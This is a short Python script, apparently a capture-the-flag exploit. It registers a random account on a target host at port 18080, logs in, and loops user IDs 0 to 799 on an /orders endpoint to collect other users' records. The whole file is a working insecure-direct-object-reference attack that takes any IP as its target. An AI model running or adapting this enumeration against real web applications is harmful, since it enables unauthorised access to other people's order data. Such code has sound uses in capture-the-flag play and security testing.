from morel import logger
from requests import Session

import uuid


def main(target_ip):
    log = logger.bind(file=f"{__name__}.log")

    email = f"{uuid.uuid4()}@{uuid.uuid4()}.com"
    password = f"{uuid.uuid4()}"
    username = f"{uuid.uuid4()}"

    flags = []

    url = "http://" + target_ip + ":18080"
    log.info(f"exploiting uid on {target_ip}")
    with Session() as s:
        resp = s.post(
            url + f"/register",
            data={"email": email, "password": password, "username": username},
        )

        log.info(f"{resp}")
        resp = s.post(url + f"/login", data={"email": email, "password": password})
        log.info(f"{resp}")
        uid = 0
        while True:
            output = s.get(url + f"/orders?uid={uid}").text
            flags.append(output)
            # log.info(output)
            uid += 1
            if uid == 800:
                break

        return flags
